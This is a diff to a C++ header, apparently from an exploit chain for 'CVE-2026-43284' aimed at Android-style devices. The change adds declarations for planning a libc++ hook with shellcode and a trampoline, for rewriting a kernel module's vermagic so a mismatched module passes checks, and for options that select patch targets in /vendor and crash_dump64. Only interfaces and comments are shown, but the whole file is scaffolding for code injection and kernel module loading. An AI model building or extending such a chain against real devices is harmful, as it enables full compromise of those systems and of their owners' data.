@@ -39,6 +39,7 @@
 #include "backend/cve_2026_43284/real_ops.hpp"
 #include "backend/cve_2026_43284/steps/chain.hpp"
 
+#include <cstddef>
 #include <cstdint>
 #include <string>
 #include <string_view>
@@ -75,18 +76,37 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
         /* The ksud failure marker (/dev/dfm1) was observed. Upstream rc 1. */
         KsudFailed,
         CleanupRejected,
+        /* B5-9h-1 hook-plan failures. */
+        HookReadFailed,
+        HookImageTooLarge,
+        HookPlanFailed,
     };
 
     [[nodiscard]] std::string_view stage_error_name(StageError error) noexcept;
 
     /* Fail-closed staged-path .ko precheck (B5-4), called before patch #2:
-     * parse the release (uname -r / canonical KMI) and run precheck_module_file
-     * (ELF/.modinfo name/vermagic/__versions/signature). Never loads anything.
-     * Returns false with the first failing rule. */
+     * run precheck_module_file against the kernel-required vermagic
+     * (ELF/.modinfo name/full vermagic/__versions/signature). Never loads
+     * anything. Returns false with the first failing rule. */
     [[nodiscard]] bool precheck_staged_module(std::string_view module_path,
-                                              std::string_view release,
+                                              const lkm::DeviceKernelFacts &required,
                                               lkm::ModuleFacts &facts,
                                               lkm::LkmImageError &error) noexcept;
+
+    /* B5-9h-3 fail-closed vermagic reconciliation over a caller-owned image
+     * (the exact bytes the plan will write). When the image fails the precheck
+     * solely because the vermagic differs and allow_rewrite is set, the
+     * .modinfo entry is rewritten in place to the required value and the image
+     * is re-prechecked. outcome reports original/required/rewritten; on every
+     * rejection the image is left untouched and error carries the first failing
+     * rule. Never loads or executes anything. */
+    [[nodiscard]] bool reconcile_module_vermagic(std::uint8_t *image,
+                                                 std::size_t image_size,
+                                                 const lkm::DeviceKernelFacts &required,
+                                                 bool allow_rewrite,
+                                                 lkm::ModuleFacts &facts,
+                                                 lkm::VermagicOutcome &outcome,
+                                                 lkm::LkmImageError &error) noexcept;
 
     /* Caller-owned module image plus the patch plan that points into it. The
      * region aliases the bytes vector; the buffer must not move after setup. */
@@ -103,6 +123,80 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
      * the module file; never touches the target. */
     [[nodiscard]] bool build_module_plan(std::string_view module_path,
                                          PlanBuffer &out, StageError &error);
+
+    /* ---- B5-9h-1 staged libc++ hook planning (read-only) ----
+     *
+     * plan_staged_hook() locates the hook symbol in a caller-owned image and
+     * builds the parameterized shellcode/trampoline description. It only reads
+     * the image through the injected read surface and never calls the write
+     * surface, so a --stage=plan run writes no byte. The embedded upstream
+     * libcxx.S template is used unless the caller overrides it. */
+    struct StagedHookPlan final {
+        bool attempted = false;
+        bool valid = false;
+        /* The displaced instruction is PC-relative (B/BL/ADR/ADRP/...): the
+         * shellcode cannot replay it meaningfully at another address, so the
+         * staged plan fails closed. This guard lives only in the staged plan;
+         * the write primitive is unchanged. */
+        bool steal_unsafe = false;
+        StageError error = StageError::None;
+        steps::HookPatchError hook_error = steps::HookPatchError::None;
+        std::string_view target{};
+        std::string_view symbol{};
+        steps::HookGuardPolicy guard = steps::HookGuardPolicy::Skip;
+        std::uint64_t hook_file_offset = 0U;
+        std::uint64_t hook_vaddr = 0U;
+        std::uint32_t displaced_instruction = 0U;
+        std::uint32_t guard_instruction = 0U;
+        bool guard_skipped = false;
+        std::uint64_t shellcode_file_offset = 0U;
+        std::uint64_t shellcode_vaddr = 0U;
+        std::size_t shellcode_len = 0U;
+        /* Mapped room at the landing site (BSS tail or executable page tail);
+         * visible so a device plan run can be checked against the mapping. */
+        std::uint64_t payload_max = 0U;
+        std::uint64_t trampoline_offset = 0U;
+        std::size_t trampoline_pos = 0U;
+        std::size_t trampoline_len = steps::kHookTrampolineBytes;
+    };
+
+    [[nodiscard]] std::string_view hook_error_name(
+            steps::HookPatchError error) noexcept;
+    [[nodiscard]] std::string_view hook_guard_name(
+            steps::HookGuardPolicy guard) noexcept;
+
+    /* Everything plan_staged_hook() needs. image/io/buffers are caller-owned
+     * and must outlive the call. A null tmpl selects the embedded upstream
+     * libcxx.S template and binds carrier_path as the shellcode ko_target. */
+    struct StagedHookRequest final {
+        const std::uint8_t *image = nullptr;
+        std::size_t image_size = 0U;
+        std::string_view hook_target{};
+        std::string_view symbol{};
+        steps::HookGuardPolicy guard = steps::HookGuardPolicy::Skip;
+        std::string_view carrier_path{};
+        const steps::ShellcodeTemplate *tmpl = nullptr;
+        const steps::ShellcodeBinding *bindings = nullptr;
+        std::size_t binding_count = 0U;
+        std::size_t displaced_slot = steps::kHookDisplacedNone;
+        steps::HookPatchIo io{};
+        std::uint8_t *shellcode_buf = nullptr;
+        std::size_t shellcode_cap = 0U;
+        std::uint8_t *shellcode_orig_buf = nullptr;
+    };
+
+    /* Fills out with the hook plan; returns out.valid. Failures are described
+     * by out.error / out.hook_error and, for a PC-relative displaced
+     * instruction, out.steal_unsafe. Read-only over the injected surface. */
+    [[nodiscard]] bool plan_staged_hook(const StagedHookRequest &request,
+                                        StagedHookPlan &out) noexcept;
+
+    /* Reads a hook-target image into memory with a hard size cap. Returns false
+     * with error == HookReadFailed (open/short read/empty) or
+     * HookImageTooLarge (size > max_bytes). Only reads the file. */
+    [[nodiscard]] bool read_hook_image(std::string_view path, std::size_t max_bytes,
+                                       std::vector<std::uint8_t> &out,
+                                       StageError &error);
 
     struct StageReport final {
         Stage stage = Stage::Plan;
@@ -126,6 +220,11 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
         std::uint64_t plan_offset = 0U;
         std::uint64_t plan_len = 0U;
         bool preimage_ok = false;
+        /* B5-9h-1 hook plan diagnostics. attempted stays false for a stage that
+         * did not plan a hook, so the run.hook record is omitted. */
+        StagedHookPlan hook{};
+        /* B5-9h-3 vermagic reconciliation outcome for the run.module record. */
+        lkm::VermagicOutcome vermagic = lkm::VermagicOutcome::Unchecked;
     };
 
     /* Pure stage semantics over injected ChainOps. For Plan it only validates
@@ -150,14 +249,35 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
      * 2 timeout, 3 patch/write/trigger/cleanup failure. */
     [[nodiscard]] int stage_exit_code(const StageReport &report) noexcept;
 
+    /* B5-9h-1 staged entry options. target_path is the positional carrier and
+     * the default when carrier_path is empty; patch1_target overrides the
+     * crash_dump64 path; hook_target/hook_symbol/hook_guard select the libc++
+     * hook asset. All defaults reproduce the pre-B5-9h-1 behaviour. */
+    struct StagedRunOptions final {
+        std::string_view module_path{};
+        std::string_view target_path{};
+        Stage stage = Stage::Full;
+        bool allow_dev_target = false;
+        std::string_view hook_target = steps::kLibcxxPath;
+        std::string_view hook_symbol = steps::kLibcxxSentrySymbol;
+        steps::HookGuardPolicy hook_guard = steps::HookGuardPolicy::Skip;
+        std::string_view carrier_path{};
+        std::string_view patch1_target = steps::kCrashDump64Path;
+        /* B5-9h-3 explicit policy switch: only an operator who has attested the
+         * module source and the target build facts may let the runner rewrite a
+         * mismatched vermagic in place. Default false keeps the reject. */
+        bool allow_vermagic_rewrite = false;
+    };
+
     /* Device entry: build the plan, read the optional session-secret frame from
      * stdin (write stages), open the target, bind make_real_chain_ops() and run
-     * one stage. Prints the structured records. Not noexcept (allocation).
-     * allow_dev_target is the explicit --allow-dev-target escape hatch: it is
-     * forwarded to ChainRequest::allow_dev_carrier_path and echoed as
-     * run.dev_target; the default false keeps the /vendor-only carrier rule. */
-    int run_stage_cli(std::string_view module_path, std::string_view target_path,
-                      Stage stage, bool allow_dev_target);
+     * one stage. For --stage=plan it additionally reads the hook target image
+     * and prints the read-only hook plan. Prints the structured records. Not
+     * noexcept (allocation). allow_dev_target is the explicit
+     * --allow-dev-target escape hatch: it is forwarded to
+     * ChainRequest::allow_dev_carrier_path and echoed as run.dev_target; the
+     * default false keeps the /vendor-only carrier rule. */
+    int run_stage_cli(const StagedRunOptions &options);
 
 } // namespace ghostlock::backend::cve_2026_43284::stage_runner
 
